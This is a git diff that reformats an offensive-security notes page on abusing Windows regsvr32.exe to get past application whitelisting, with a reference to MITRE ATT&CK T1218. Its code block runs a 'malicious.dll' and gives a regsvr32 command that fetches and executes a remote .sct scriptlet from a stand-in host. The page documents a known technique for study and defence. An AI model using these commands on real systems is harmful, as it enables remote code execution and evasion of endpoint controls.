@@ -1,15 +1,15 @@
-# RegSrv32 - code execution
+# RegSrv32
 
-# Theory
+## Theory
 
-Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)  in the Windows Registry. Besides its intended use, regsvr32.exe binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting.  
+Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs) in the Windows Registry. Besides its intended use, regsvr32.exe binary can also be used to execute arbitrary binaries and bypass the Windows Application Whitelisting.
 
-Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system. 
+Application Whitelisting is a Microsoft endpoint security feature that prevents malicious and unauthorized programs from executing in real-time. Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system.
 
-# Practice
+## Practice
+
 {% tabs %}
 {% tab title="Regsvr32.exe" %}
-
 ```bash
 #Execute dll
 c:\Windows\System32\regsvr32.exe c:\Users\pwn\Downloads\malicious.dll
@@ -33,7 +33,8 @@ c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloa
 </registration>
 </scriptlet>
 ```
-The MITRE ATT&CK framework refers to this technique as [Signed Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/)
+
+The MITRE ATT\&CK framework refers to this technique as [Signed Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/)
 {% endtab %}
 {% endtabs %}
 
